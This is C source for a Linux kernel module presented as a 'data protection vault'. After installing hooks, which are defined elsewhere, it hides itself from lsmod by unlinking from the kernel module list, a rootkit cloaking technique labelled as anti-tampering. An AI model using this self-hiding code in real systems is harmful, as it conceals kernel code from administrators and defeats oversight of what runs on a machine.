#include "vvaltz.h"
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dinh Van Viet");
MODULE_DESCRIPTION("LSM Kernel Data Protection Vault Module");
MODULE_VERSION("1.0");

struct list_head *module_list_backup = NULL;
int is_cloaked = 0;

void hide_myself(void)
{
  if (is_cloaked == 0) {
    module_list_backup = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_cloaked = 1;
    printk(KERN_INFO "[VVALTZ] Anti-tampering engaged. Module hidden from lsmod.\n");
  }
}

void unhide_myself(void)
{
  if (is_cloaked == 1) {
    if (module_list_backup != NULL) {
      list_add(&THIS_MODULE->list, module_list_backup);
      is_cloaked = 0;
      printk(
          KERN_INFO
          "[VVALTZ] Teardown preparation: Module restored to global list.\n");
    }
  }
}

static int __init vvaltz_init(void) 
{
  int ret;
  printk(KERN_INFO "[VVALTZ] System component initialization started...\n");

  ret = init_proc_interface();
  if (ret < 0) {
    return ret;
  }

  ret = install_hooks();
  if (ret < 0) {
    remove_proc_interface();
    return ret;
  }

  hide_myself();

  printk(KERN_INFO
         "[VVALTZ] Protection engine online, monitoring, and cloaked.\n");
  return 0;
}

static void __exit vvaltz_exit(void)
{
  printk(KERN_INFO "[VVALTZ] Initiating structural teardown sequence...\n");
  remove_hooks();
  remove_proc_interface();
}

module_init(vvaltz_init);
module_exit(vvaltz_exit);